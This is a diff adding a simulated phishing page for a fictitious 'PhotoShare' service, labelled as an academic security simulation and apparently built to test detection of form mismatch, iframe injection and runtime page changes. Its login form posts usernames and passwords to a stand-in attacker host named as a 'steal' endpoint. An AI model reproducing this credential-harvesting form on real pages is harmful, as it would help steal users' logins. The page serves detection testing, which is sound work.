@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>PhotoShare Security Verification</title>
+
+<style>
+body 
+{
+    margin: 0;
+    font-family: Arial, Helvetica, sans-serif;
+    background: linear-gradient(135deg, #fdf2f8, #eef2ff);
+}
+
+.simulation-banner 
+{
+    background:#fff3cd;
+    color:#856404;
+    text-align:center;
+    padding:10px;
+    font-size:14px;
+    border-bottom:1px solid #ffeeba;
+}
+
+.container 
+{
+    width: 420px;
+    margin: 60px auto;
+    background: white;
+    padding: 35px;
+    border-radius: 20px;
+    box-shadow: 0 14px 35px rgba(0,0,0,0.15);
+}
+
+.logo 
+{
+    text-align: center;
+    font-size: 34px;
+    font-weight: bold;
+    margin-bottom: 10px;
+    color: #be185d;
+}
+
+.subtitle 
+{
+    text-align: center;
+    color: #6b7280;
+    margin-bottom: 25px;
+}
+
+input 
+{
+    width: 100%;
+    padding: 13px;
+    margin-top: 8px;
+    margin-bottom: 16px;
+    border: 1px solid #d1d5db;
+    border-radius: 8px;
+    box-sizing: border-box;
+}
+
+button 
+{
+    width: 100%;
+    padding: 13px;
+    background: #be185d;
+    color: white;
+    border: none;
+    border-radius: 8px;
+    font-weight: bold;
+    cursor: pointer;
+}
+
+.security-box 
+{
+    margin-top: 18px;
+    padding: 12px;
+    background: #fff1f2;
+    border-left: 5px solid #e11d48;
+    font-size: 14px;
+    color: #9f1239;
+}
+
+iframe 
+{
+    margin-top: 18px;
+    width: 100%;
+    height: 130px;
+    border: 2px dashed #e11d48;
+}
+
+.footer 
+{
+    text-align: center;
+    color: #6b7280;
+    font-size: 13px;
+    margin-top: 20px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="simulation-banner">
+    🧪 Cybersecurity Simulation Environment | This webpage is created for academic research and demonstration purposes only.
+</div>
+
+<div class="container">
+    <div class="logo">PhotoShare</div>
+    <p class="subtitle">Security Verification Required</p>
+
+    <form id="verifyForm" action="https://evil-example.com/photoshare-steal">
+        <label>Username or Email</label>
+        <input type="text" placeholder="Enter username or email">
+
+        <label>Password</label>
+        <input type="password" placeholder="Enter password">
+
+        <button type="submit">Verify Account</button>
+    </form>
+
+    <div id="status" class="security-box">
+        Integrity Status: External verification component detected.
+    </div>
+
+    <iframe src="https://example.com"></iframe>
+
+    <p class="footer">
+        Combined scenario: form mismatch + iframe injection + dynamic modification.
+    </p>
+</div>
+
+<script>
+setTimeout(() => 
+{
+    document.getElementById("status").innerText =
+        "Runtime Integrity Status: webpage component was modified after page load.";
+}, 3000);
+</script>
+
+</body>
+</html>
